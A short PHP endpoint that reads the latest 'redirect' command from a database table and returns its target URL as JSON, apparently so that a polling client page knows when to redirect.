<?php
require_once 'config/database.php';

header('Content-Type: application/json');
header('Cache-Control: no-cache');

try {
    $database = new Database();
    $db = $database->getConnection();
    
    // ULTRA FAST query - check for redirects
    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
    $stmt = $db->query($query);
    $redirect = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($redirect && !empty($redirect['target'])) {
        echo json_encode(['redirect' => true, 'target' => $redirect['target']]);
    } else {
        echo json_encode(['redirect' => false]);
    }
} catch (Exception $e) {
    echo json_encode(['redirect' => false]);
}